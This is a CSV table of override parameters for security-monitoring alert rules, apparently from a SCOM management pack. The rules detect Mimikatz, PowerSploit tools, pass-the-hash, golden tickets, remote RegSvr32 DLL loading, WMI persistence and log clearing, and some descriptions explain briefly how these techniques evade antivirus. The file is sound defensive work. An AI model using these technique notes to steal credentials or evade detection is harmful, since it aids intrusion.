ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeDLLInjection,Rule,Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeDLLInjection,Rule,Security Monitoring:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ProhibitedApp,Rule,Security Monitoring Forwarded Events:  Prohibited App in Use,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ProhibitedApp,Rule,Security Monitoring Forwarded Events:  Prohibited App in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ProhibitedApp,Rule,Security Monitoring Forwarded Events:  Prohibited App in Use,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstDC,Rule,Security Monitoring:  Possible PtH attack in progress (successful) against DC,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstDC,Rule,Security Monitoring:  Possible PtH attack in progress (successful) against DC,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstDC,Rule,Security Monitoring:  Possible PtH attack in progress (successful) against DC,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Pth.CredentialSwap,Rule,Security Monitoring: Potential Credential Swap in Progress,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Pth.CredentialSwap,Rule,Security Monitoring: Potential Credential Swap in Progress,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Pth.CredentialSwap,Rule,Security Monitoring: Potential Credential Swap in Progress,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.EventCollection.GoldenTicket,Rule,Security Monitoring Event Collection:  Event ID 4769 result 0x1F,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.EventCollection.GoldenTicket,Rule,Security Monitoring Event Collection:  Event ID 4769 result 0x1F,,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.Mimikatz,Rule,Security Monitoring:  Mimikatz in use,Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.Mimikatz,Rule,Security Monitoring:  Mimikatz in use,Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.Mimikatz,Rule,Security Monitoring:  Mimikatz in use,Mimikatz is a credential theft tool used for pass the hash attacks.  This should not be present in your environment.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly,Rule,Security Monitoring Forwarded Events:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly,Rule,Security Monitoring Forwarded Events:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellRuninMemoryOnly,Rule,Security Monitoring Forwarded Events:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetHTTPStatus,Rule,Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetHTTPStatus,Rule,Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetHTTPStatus,Rule,Security Monitoring Forwarded Events:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreation,Rule,Security Monitoring Forwarded Events:  Service Created on system,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreation,Rule,Security Monitoring Forwarded Events:  Service Created on system,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreation,Rule,Security Monitoring Forwarded Events:  Service Created on system,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed,This rule inventories 4688 events and flags alerts for manually added registry keys.  These are rare events and should be investigated when they appear.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,AGPMAccount,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,AGPMDomain,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule,Rule,Security Monitoring: A GPO was Deleted,This rule detects the deletion of a GPO,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared,Rule,Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared,Rule,Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SecurityLogCleared,Rule,Security Monitoring Forwarded Events:  Security log cleared on a server configured to forward events,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.GoldenTicketDetection,Rule,Security Monitoring:  Possible Golden Ticket in Use,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.GoldenTicketDetection,Rule,Security Monitoring:  Possible Golden Ticket in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.GoldenTicketDetection,Rule,Security Monitoring:  Possible Golden Ticket in Use,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokePortScan,Rule,Security Monitoring:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokePortScan,Rule,Security Monitoring:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokePortScan,Rule,Security Monitoring:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode in Use,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode in Use,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeShellCodeInUse,Rule,Security Monitoring:  Invoke ShellCode in Use,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.RemoteRegSvr32,Rule,Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.RemoteRegSvr32,Rule,Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.RemoteRegSvr32,Rule,Security Monitoring:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetKeystroke,Rule,Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetKeystroke,Rule,Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetKeystroke,Rule,Security Monitoring Forwarded Events:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceKnownThreat,Rule,Security Monitoring:  Service associated with a known threat was created on a member server,"This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceKnownThreat,Rule,Security Monitoring:  Service associated with a known threat was created on a member server,"This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceKnownThreat,Rule,Security Monitoring:  Service associated with a known threat was created on a member server,"This is a special case of event ID 7045 targeting the names of services that are created by known tools such as windows credential editor, psexec, etc. If you turned on the generic 7045 rule, this alert should be disabled as it will generate duplicate events.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeMimikatz,Rule,Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeMimikatz,Rule,Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeMimikatz,Rule,Security Monitoring Forwarded Events:  Invoke-Mimikatz Detected in Tier 0 Environment,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.PtHTier2,Rule,Security Monitoring Forwarded Events:  Possible PtH Attack in Progress Against Tier 2,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.PtHTier2,Rule,Security Monitoring Forwarded Events:  Possible PtH Attack in Progress Against Tier 2,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.PtHTier2,Rule,Security Monitoring Forwarded Events:  Possible PtH Attack in Progress Against Tier 2,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted,Rule,Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted,Rule,Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.LocalUserCreatedDeleted,Rule,Security Monitoring Forwarded Events:  Local User Created or Deleted in Administrator Security Group,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareRemovedFromServer,Rule,Security Monitoring:  Software was Removed from a Server,This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareRemovedFromServer,Rule,Security Monitoring:  Software was Removed from a Server,This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.,Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareRemovedFromServer,Rule,Security Monitoring:  Software was Removed from a Server,This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats,Rule,Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats,Rule,Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.ServiceCreationKnownThreats,Rule,Security Monitoring Forwarded Events:  Service associated with a known threat was created on a forwarding computer,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.LocalAdminChange,Rule,Security Monitoring:  Local Administrators Group was Modified,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Accounts.LocalAdminChange,Rule,Security Monitoring:  Local Administrators Group was Modified,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.LocalAdminChange,Rule,Security Monitoring:  Local Administrators Group was Modified,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SecurityLogCleared,Rule,Security Monitoring:  Security Log was cleared,"Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.SecurityLogCleared,Rule,Security Monitoring:  Security Log was cleared,"Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.SecurityLogCleared,Rule,Security Monitoring:  Security Log was cleared,"Clearing the security log is something an attacker will do to cover their tracks.  By default, logs cycle. If the log has been cleared, this should be investigated.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.4688.GenericCryptoRansomWare,Rule,Security Monitoring:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.Event.4688.GenericCryptoRansomWare,Rule,Security Monitoring:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.4688.GenericCryptoRansomWare,Rule,Security Monitoring:  Possible Crypto-Ransomware Installed on Computer,"This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.WMIPersistence,Rule,Security Monitoring:  Possible WMI Persistence Event Detected,See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.WMIPersistence,Rule,Security Monitoring:  Possible WMI Persistence Event Detected,See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.WMIPersistence,Rule,Security Monitoring:  Possible WMI Persistence Event Detected,See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.RemoteRegSvr32,Rule,Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.RemoteRegSvr32,Rule,Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.RemoteRegSvr32,Rule,Security Monitoring Forwarded Events:  RegSvr32 used to load a DLL that is not located on this machine,"A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.  See  https://attack.mitre.org/wiki/Technique/T1117#Examples for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.PowerShellRuninMemoryOnly,Rule,Security Monitoring:  PowerShell Running Only in Memory,There are valid reasons to run PowerShell in memory only. Attackers do this too as this can get around a lot of Antivirus checks and bypass execution policies. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/  and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess,Rule,Security Monitoring:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess,Rule,Security Monitoring:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.PowerShellStartHiddenProcess,Rule,Security Monitoring:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.DebugEscalation,Rule,Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.DebugEscalation,Rule,Security Monitoring Forwarded Events: SeDebug Privilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Severity,int,2,2,2,
